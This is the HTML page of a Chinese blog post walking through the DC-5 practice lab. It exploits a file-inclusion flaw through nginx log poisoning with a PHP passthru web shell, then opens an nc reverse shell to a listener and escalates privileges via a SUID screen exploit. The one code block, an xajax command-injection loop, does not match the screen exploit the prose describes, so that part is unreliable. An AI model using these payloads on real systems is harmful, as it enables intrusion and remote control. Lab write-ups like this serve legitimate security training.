@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    DC-5 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-mvdmkl" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      DC-5
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/04/13/mvdmkl/" class="article-date">
+  <time datetime="2020-04-13T13:05:05.000Z" itemprop="datePublished">2020-04-13</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>使用 nmap 扫描端口<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586783525210-4be1a5ef-66b0-4ef5-b4e5-d68b72303580.png#align=left&display=inline&height=532&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=713&size=146282&status=done&style=none&width=509" alt="image.png"><br>在 contact 填写完以后，返回一个 thankyou.php 有文件包含漏洞<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586783947285-981e0d98-05d2-4f7b-9915-379cd2c9b140.png#align=left&display=inline&height=467&margin=%5Bobject%20Object%5D&name=image.png&originHeight=933&originWidth=1658&size=519436&status=done&style=none&width=829" alt="image.png"></p>
+<p>！？怎么找到的？？<br>大佬们通过扫目录，扫出来的结果去看了一下（字典实在是太大，我就不扫了，白费劲）</p>
+<p>发现这个页面每次加载都是不一样的，然后<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586784437529-a8b24731-6639-4f55-b49c-b26c117e1469.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=171&originWidth=474&size=13795&status=done&style=stroke&width=308" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586784488779-567a906f-0d59-4afa-b77a-6c680d73c045.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&name=image.png&originHeight=167&originWidth=459&size=13231&status=done&style=stroke&width=309" alt="image.png"><br>在 thankyou.php 也有这样的情况，所以有理由怀疑是 thankyou.php 包含了这个文件<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586784562489-8fb7e5a7-c356-4898-97a1-34faab51ebcf.png#align=left&display=inline&height=257&margin=%5Bobject%20Object%5D&name=image.png&originHeight=430&originWidth=806&size=34736&status=done&style=stroke&width=482" alt="image.png"><br>同时 fuzz 试出来一个 file 参数，mark 一下，收集一些字典整理一下，好久之前就应该做这个事情了<br>在扫描端口阶段注意到这是个 nginx 的服务，通过包含日志文件来 getshell</p>
+<p>带着这个访问：<?php passthru($_GET['yichen']); ?><br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586826129278-af7fa54b-488f-4ecd-a2c3-157a2ee086cc.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&name=image.png&originHeight=423&originWidth=576&size=41398&status=done&style=none&width=288" alt="image.png"><br>然后如包含日志文件 /var/log/nginx/access.log，同时可以跟上命令了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586826089207-d2b21e59-daa5-4f09-800b-8f5ca804f250.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1080&originWidth=1920&size=232117&status=done&style=none&width=960" alt="image.png"><br>那既然这样，就 nc 反弹一个 shell 把，在 kali 上监听一个 6666 端口<br><code>nc -lvp 6666</code></p>
+<p>浏览器访问一下就连上了，192.168.149.163/thankyou.php?file=/var/log/nginx/access.log&amp;yichen=nc 192.168.149.141 6666 -c /bin/bash<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586826466617-850c9f22-e2d4-432c-8648-4a0a0eedf2b5.png#align=left&display=inline&height=262&margin=%5Bobject%20Object%5D&name=image.png&originHeight=382&originWidth=687&size=53658&status=done&style=none&width=472" alt="image.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>suid 提权：<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>先看一下有没有能用的<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586826709528-ab3d46b9-6aa1-4efd-9270-f7aaa18a8c98.png#align=left&display=inline&height=238&margin=%5Bobject%20Object%5D&name=image.png&originHeight=378&originWidth=708&size=60041&status=done&style=none&width=445" alt="image.png"><br>搜一下 <code>searchsploit screen</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586826676246-aeb86595-b83d-43e8-b4ac-0a59c5ef8e76.png#align=left&display=inline&height=351&margin=%5Bobject%20Object%5D&name=image.png&originHeight=764&originWidth=1625&size=346438&status=done&style=none&width=746" alt="image.png"></p>
+<p>分别把两个 C 语言文件拷出来，按照  sh  脚本的命令编译好了（然后把前面的去掉就可以了）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo $0;URL="$&#123;1&#125;"</span><br><span class="line">while true;do</span><br><span class="line"> echo -n "$ "; read cmd</span><br><span class="line"> curl --silent -d "xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \"BEGIN\";$&#123;cmd&#125;;echo \"END\"&amp;xajaxargs[]=ping" "$&#123;URL&#125;" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>用 vi 打开该 sh 文件，使用 :set ff=unix 保存<br>然后再通过  nc  传过去<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586852100408-f6dbf104-0af0-490e-be91-d22eb74b9dbb.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=933&originWidth=1658&size=390660&status=done&style=none&width=746" alt="image.png"><br>执行脚本提权<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586852257078-ed95c0f3-3639-4919-a68d-6f9282296532.png#align=left&display=inline&height=223&margin=%5Bobject%20Object%5D&name=image.png&originHeight=446&originWidth=901&size=53168&status=done&style=none&width=450.5" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/04/13/mvdmkl/" data-id="ckco53qbe000b8ou98s192jzh" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/04/14/ab4zbp/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            PWN入门（堆相关知识）
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/04/06/ttamkh/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">DC-4</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
